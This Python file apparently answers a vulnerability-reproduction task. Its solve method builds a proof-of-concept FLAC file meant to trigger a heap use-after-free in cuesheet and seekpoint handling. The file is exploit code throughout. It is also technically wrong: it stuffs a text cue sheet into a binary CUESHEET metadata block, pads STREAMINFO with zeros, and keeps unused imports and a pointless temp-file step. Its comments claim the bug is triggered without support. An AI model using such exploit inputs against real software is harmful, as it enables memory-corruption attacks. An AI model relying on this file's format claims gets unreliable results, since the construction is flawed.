import os
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal FLAC file with cuesheet metadata
        # This creates a valid FLAC file with a cuesheet that triggers
        # the heap use-after-free when appending seekpoints
        
        # First, create a temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Create the cuesheet content
            # The vulnerability occurs when appending seekpoints causes realloc
            # but the old pointer is still used
            cuesheet = """FILE "dummy.wav" WAVE
  TRACK 01 AUDIO
    INDEX 01 00:00:00
  TRACK 02 AUDIO
    INDEX 01 00:00:00
  TRACK 03 AUDIO
    INDEX 01 00:00:00
  TRACK 04 AUDIO
    INDEX 01 00:00:00
  TRACK 05 AUDIO
    INDEX 01 00:00:00
  TRACK 06 AUDIO
    INDEX 01 00:00:00
  TRACK 07 AUDIO
    INDEX 01 00:00:00
  TRACK 08 AUDIO
    INDEX 01 00:00:00
  TRACK 09 AUDIO
    INDEX 01 00:00:00
  TRACK 10 AUDIO
    INDEX 01 00:00:00
  TRACK 11 AUDIO
    INDEX 01 00:00:00
  TRACK 12 AUDIO
    INDEX 01 00:00:00
  TRACK 13 AUDIO
    INDEX 01 00:00:00
  TRACK 14 AUDIO
    INDEX 01 00:00:00
  TRACK 15 AUDIO
    INDEX 01 00:00:00
  TRACK 16 AUDIO
    INDEX 01 00:00:00
  TRACK 17 AUDIO
    INDEX 01 00:00:00
  TRACK 18 AUDIO
    INDEX 01 00:00:00
  TRACK 19 AUDIO
    INDEX 01 00:00:00
  TRACK 20 AUDIO
    INDEX 01 00:00:00
"""
            
            # Create a FLAC file with the cuesheet
            # We need to create a valid FLAC file with cuesheet metadata
            # The exact format that triggers the bug:
            # 1. Create a cuesheet with many tracks
            # 2. The bug happens when appending seekpoints after realloc
            
            # We'll create a minimal FLAC file with cuesheet metadata block
            # FLAC file structure: fLaC header + METADATA_BLOCK_STREAMINFO + METADATA_BLOCK_CUESHEET
            
            # First 4 bytes: "fLaC" signature
            flac_data = bytearray(b'fLaC')
            
            # METADATA_BLOCK_STREAMINFO (type 0, last-metadata-block flag = 0 for this block)
            # Block length: 34 bytes
            streaminfo_block = bytearray(38)
            # First byte: 0x00 (type 0, not last)
            streaminfo_block[0] = 0x00
            # Next 3 bytes: length = 34 (0x000022 in big-endian)
            streaminfo_block[1] = 0x00
            streaminfo_block[2] = 0x00
            streaminfo_block[3] = 0x22
            
            # Add minimal streaminfo data (all zeros is fine for PoC)
            # We just need the structure to be valid
            streaminfo_block[4:] = b'\x00' * 34
            
            flac_data.extend(streaminfo_block)
            
            # Now add CUESHEET metadata block (type 5)
            # The cuesheet data needs to trigger the realloc bug
            
            # Convert cuesheet to bytes (UTF-8)
            cuesheet_bytes = cuesheet.encode('utf-8')
            
            # Calculate block length
            block_length = len(cuesheet_bytes)
            
            # Create metadata block header
            # Type 5, last-metadata-block flag = 1 (this is the last block)
            cuesheet_block = bytearray(4)
            cuesheet_block[0] = 0x85  # Type 5 (0x05) with last-block flag set (0x80)
            
            # Block length in big-endian (3 bytes)
            cuesheet_block[1] = (block_length >> 16) & 0xFF
            cuesheet_block[2] = (block_length >> 8) & 0xFF
            cuesheet_block[3] = block_length & 0xFF
            
            flac_data.extend(cuesheet_block)
            flac_data.extend(cuesheet_bytes)
            
            # Save the FLAC file
            flac_path = tmpdir_path / "poc.flac"
            with open(flac_path, 'wb') as f:
                f.write(flac_data)
            
            # Read the file back as bytes
            with open(flac_path, 'rb') as f:
                poc_data = f.read()
            
            return poc_data
